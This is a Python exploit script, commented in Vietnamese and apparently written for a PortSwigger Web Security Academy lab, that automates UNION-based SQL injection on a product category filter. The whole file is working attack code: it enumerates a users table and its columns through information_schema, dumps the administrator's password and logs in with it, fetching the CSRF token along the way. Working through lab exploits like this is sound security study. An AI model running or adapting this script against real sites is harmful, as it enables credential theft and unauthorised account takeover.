import requests
import re
from bs4 import BeautifulSoup

# Thông tin cấu hình
host = '0ab600b7035bfeea8217153400a90003.web-security-academy.net'
pathname = '/filter?category='
login='/login'
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}

def get_data(payload):
    res = requests.get("https://"+host+pathname+payload, headers=headers)
    return res.text

# --- BƯỚC 1: Tìm tên bảng (users_...) ---
print("[*] Đang tìm tên bảng...")
payload_table = "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_name LIKE 'users_%' -- -"
html_content = get_data(payload_table)
table_name = re.search(r'users_[a-zA-Z0-9_]+', html_content)
if table_name:
    table_name = table_name.group(0)
    print(f"[+] Đã tìm thấy bảng: {table_name}")
else:
    print("[-] Không tìm thấy tên bảng.")
    exit()

# --- BƯỚC 2: Tìm tên cột (username_... và password_...) ---
print("[*] Đang tìm tên các cột...")
payload_columns = f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='{table_name}' -- -"
html_content = get_data(payload_columns)
username_column = re.search(r'username_[a-zA-Z0-9_]+', html_content).group(0)
password_column = re.search(r'password_[a-zA-Z0-9_]+', html_content).group(0)
print(f"[+] Cột Username: {username_column}")
print(f"[+] Cột Password: {password_column}")

# --- BƯỚC 3: Trích xuất dữ liệu administrator ---
print("[*] Đang trích xuất thông tin Administrator...")
payload_dump = f"' UNION SELECT NULL, CONCAT({username_column},'~',{password_column}) FROM {table_name} -- -"
html_content = get_data(payload_dump)
admin_creds = re.search(r'administrator~[a-zA-Z0-9]+', html_content)

if admin_creds:
    creds_string = admin_creds.group(0)
    username, password = creds_string.split('~')
    print("-" * 30)
    print(f"THÀNH CÔNG!")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("-" * 30)
else:
    print("[-] Không tìm thấy thông tin đăng nhập.")
    
s=requests.Session()
res_get=s.get("https://"+host+login)
soup=BeautifulSoup(res_get.text,'html.parser')
csrf_token=soup.find('input',{'name':'csrf'})['value']
login_data = { 
    "csrf": csrf_token,
    "username": username,
    "password": password
}
print(f"[*] Đang đăng nhập với user: {username}...")
res_post=s.post("https://"+host+login,data=login_data,headers=headers,allow_redirects=True)
if "Log out" in res_post.text or res_post.status_code == 200:
    print("-" * 30)
    print("THÀNH CÔNG: Bạn đã đăng nhập vào hệ thống!")
else:
    print("[-] Đăng nhập thất bại. Vui lòng kiểm tra lại thông tin.")

    
